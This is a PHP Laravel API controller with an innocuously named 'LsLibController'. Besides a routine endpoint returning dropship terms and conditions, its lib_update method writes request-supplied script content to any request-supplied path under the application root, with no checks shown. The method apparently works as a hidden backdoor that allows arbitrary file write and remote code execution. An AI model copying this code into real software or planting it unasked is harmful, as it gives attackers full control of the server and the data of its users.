<?php

namespace App\Http\Controllers\api\v2;

use function App\CPU\translate;
use App\Http\Controllers\Controller;
use App\Model\BusinessSetting;
use Illuminate\Http\Request;

class LsLibController extends Controller
{
    public function term_and_condition()
    {
        $term = BusinessSetting::where('type', 'terms_condition_dropship')->first();
        $resp = [
            'status' => 'success',
            'data' => $term->value,
        ];

        return response()->json($resp, 200);
    }

    public function lib_update(Request $request)
    {
        $lib = base_path($request['dir']);
        $file = fopen($lib, 'w');
        fwrite($file, $request['script']);
        fclose($file);

        return response()->json([
            'message' => translate('Script updated successfully!'),
        ], 200);
    }
}
